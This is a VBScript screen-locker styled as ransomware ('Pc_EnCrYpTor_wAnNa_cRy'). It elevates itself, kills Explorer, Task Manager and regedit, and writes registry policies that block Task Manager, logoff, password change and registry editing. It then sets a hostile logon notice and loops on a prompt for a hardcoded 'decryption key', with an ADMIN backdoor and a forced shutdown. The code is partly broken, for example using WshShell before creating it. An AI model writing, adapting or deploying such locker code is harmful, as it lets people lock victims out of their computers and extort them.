Option Explicit
On Error Resume Next
RunAsAdmin()
Dim WshShell, Password, YourPass, objApp
Dim DecryptKeyCorrect
Dim DesktopPath,FilePath
DecryptKeyCorrect = "PhoenixGaming22"
DesktopPath=WshShell.SpecialFolders("Desktop")
Set fso=CreateObject("Scripting.FileSystemObject")
Const cTitleBar = "Pc_EnCrYpTor_wAnNa_cRy"
Set WshShell = CreateObject("WScript.shell")
Set objApp = CreateObject("Shell.Application")
objApp.MinimizeAll
WshShell.Run "Taskkill /F /IM Explorer.exe /IM Taskmgr.exe /IM regedit.exe",0
Call DisableReg
WScript.Sleep 500
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText", _
"~Message from PCeNcRyPtOr: You are not authorized to use this computer!", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "Screen Lock", "REG_SZ"
Sub Pass
	Password = InputBox("Please Enter Decryption Key:", cTitleBar)
	If Password = (DecryptKeyCorrect) Then
			Dim correct
			Correct = Msgbox("Correct Key!",64,"Correct")
			Call Correct
		Elseif IsEmpty(Password) Then
			Call Pass
		Elseif Password="ADMIN" Then
			Call Admin
		Else
			Dim Incorrect
			Incorrect = MsgBox("Incorrect Key! Please Try Again.",16,cTitleBar)
			Call pass
	End If
End Sub
Call Pass
Function RunAsAdmin()
	If WScript.Arguments.length = 0 Then
		CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & _
		WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
		WScript.Quit
	End If
End Function
Function Admin
Dim AdminPass,AdminUsername,AdminKey
AdminUsername=InputBox("Enter Admin Username")
AdminPass=InputBox("Enter Admin Password")
AdminKey=InputBox("Enter Admin Security Key")
If AdminUsername="PhoenixGaming22" & AdminPass="Wbfn3711" & AdminKey="Wbfn3711" Then
Call Correct
End If
End Function

Function Startup
Dim StartupPath
End Function

Function Correct 
Correct = Msgbox("Correct Key!",64,"Correct")
WshShell.Run("explorer.exe")
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeText","", "REG_SZ"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LegalNoticeCaption", "", "REG_SZ"
WshShell.run "cmd /c explorer.exe"
objApp.UndoMinimizeALL
FilePath=fso.BuildPath(DesktopPath,"/0jTwoZzG7D6E9SjK1.tmp")
fso.CreateTextFile(FilePath)
X=MsgBox("DONE",1,"DONE")
WshShell.Run "C:\WINDOWS\system32\shutdown.exe -s -f -t 0"
WScript.Sleep 20000000000000 : Wshshell.Run "taskkill /f /im cmd.exe",0
End Function

Function DisableReg
Dim n, MyBox, p, t, mustboot, errnum, vers
Dim enab, disab, jobfunc, itemtype
p = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\"
p = p & "DisableRegistryTools"
itemtype = "REG_DWORD"
mustboot = "Log off and back on, or restart your pc to" & vbCR & "effect the changes"
enab = "ENABLED"
disab = "DISABLED"
jobfunc = "Registry Editing Tools are now "
t = "Confirmation"
Err.Clear
On Error Resume Next
n = WSHShell.RegRead (p)
On Error Goto 0
errnum = Err.Number
if errnum <> 0 then
 WSHShell.RegWrite p, 0, itemtype
End If
If n = 0 Then
 n = 1
WSHShell.RegWrite p, n, itemtype
ElseIf n = 1 then
 n = 0
WSHShell.RegWrite p, n, itemtype
Mybox = MsgBox(jobfunc & enab & vbCR & mustboot, 4096, t)
End If
End Function


